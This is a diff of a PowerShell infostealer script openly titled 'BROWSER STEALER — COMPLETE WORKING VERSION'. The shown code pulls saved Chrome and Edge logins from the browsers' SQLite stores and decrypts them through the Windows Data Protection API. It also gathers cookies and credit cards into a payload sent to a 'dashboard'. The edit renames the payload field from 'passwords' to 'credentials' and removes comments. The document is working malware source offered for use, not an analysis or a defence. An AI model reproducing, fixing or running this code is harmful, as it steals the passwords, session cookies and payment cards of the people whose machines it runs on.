@@ -1,6 +1,6 @@
 # ============================================================
 # BROWSER STEALER — COMPLETE WORKING VERSION
-# Downloads SQLite DLL + Decrypts Passwords Properly
+# Sends credentials (username/email + password) to dashboard
 # ============================================================
 
 $ErrorActionPreference = "Continue"
@@ -18,7 +18,7 @@ function Write-Log {
 }
 
 Write-Log "============================================"
-Write-Log "  BROWSER STEALER v3.0 (Password Decryption)"
+Write-Log "  BROWSER STEALER v3.0"
 Write-Log "  Target: $env:COMPUTERNAME"
 Write-Log "  Log: $LOGFILE"
 Write-Log "============================================"
@@ -126,7 +126,7 @@ function Read-SQLite {
 }
 
 # ============================================================
-# PASSWORD DECRYPTION FUNCTION (FIXES SAVED PASSWORDS)
+# PASSWORD DECRYPTION FUNCTION
 # ============================================================
 
 function Decrypt-BrowserPassword {
@@ -137,7 +137,6 @@ function Decrypt-BrowserPassword {
     if ($EncryptedData.Length -eq 0) { return $null }
     
     try {
-        # Chrome/Edge encrypts passwords using Windows Data Protection API
         Add-Type -AssemblyName System.Security
         $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
             $EncryptedData, 
@@ -146,7 +145,6 @@ function Decrypt-BrowserPassword {
         )
         return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
     } catch {
-        # If decryption fails, try to return the raw data as a string
         try {
             return [System.Text.Encoding]::UTF8.GetString($EncryptedData)
         } catch {
@@ -233,21 +231,17 @@ function Get-BrowserPasswords {
             $username = $r['username_value']
             $encryptedPassword = $r['password_value']
             
-            # Try to decrypt the password
             $decryptedPassword = $null
             if ($encryptedPassword -and $encryptedPassword -is [byte[]]) {
                 $decryptedPassword = Decrypt-BrowserPassword -EncryptedData $encryptedPassword
             } elseif ($encryptedPassword -and $encryptedPassword -is [string]) {
-                # If it's already a string, use it directly
                 $decryptedPassword = $encryptedPassword
             }
             
-            # If decryption failed, try to use the raw value
             if (-not $decryptedPassword -and $encryptedPassword) {
                 $decryptedPassword = [System.Text.Encoding]::UTF8.GetString($encryptedPassword)
             }
             
-            # Only add if we have a username and password
             if ($username -and $decryptedPassword -and $username -ne "" -and $decryptedPassword -ne "") {
                 $u = $r['origin_url']
                 if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
@@ -443,7 +437,7 @@ if ($allCookies.Count -eq 0 -and $allPasswords.Count -eq 0 -and $allCards.Count 
 }
 
 # ============================================================
-# BUILD PAYLOAD — INCLUDES PC NAME + PowerShell Browser
+# BUILD PAYLOAD — FIXED: Sends 'credentials' (not 'passwords')
 # ============================================================
 
 $pcName = $env:COMPUTERNAME
@@ -451,7 +445,7 @@ $userName = $env:USERNAME
 
 $payload = @{
     cookies = $allCookies
-    passwords = $allPasswords
+    credentials = $allPasswords   # <-- THIS IS THE FIX: 'credentials' not 'passwords'
     cards = $allCards
     system = @{
         hostname = $pcName
